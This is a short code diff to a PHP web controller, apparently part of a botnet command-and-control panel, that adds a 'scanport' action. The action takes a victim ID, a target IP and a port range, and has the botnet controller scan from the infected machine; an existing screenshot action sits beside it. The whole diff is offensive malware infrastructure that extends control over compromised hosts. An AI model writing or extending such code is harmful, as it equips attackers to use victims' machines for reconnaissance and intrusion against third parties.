@@ -155,6 +155,27 @@ class NetworkController extends Controller
         return redirect("/network/$group_id");
     }
 
+    public function scanport(Request $request)
+    {
+        $victim_uid = $request->victim_uid;
+        $group_id = $request->group_id;
+        $ip = $request->ip;
+        $port1 = $request->port1;
+        $port2 = $request->port2;
+
+        if ($port2 < $port1 && $port2 != ""){
+            return redirect("/network/$group_id")->with('output', "Port de fin doit être supérieur au port de début.");
+        }
+        
+        if($port2 == ""){
+            $scan = (new BotnetController)->scanport($victim_uid, $ip, $port1);
+        }else{
+            $scan = (new BotnetController)->scanports($victim_uid, $ip, $port1, $port2);
+        }
+
+        return redirect("/network/$group_id")->with('output', "Scan lancé sur l'adresse $ip.");
+    }
+
     public function screenshot(Request $request)
     {
         $group_id = $request->group_id;
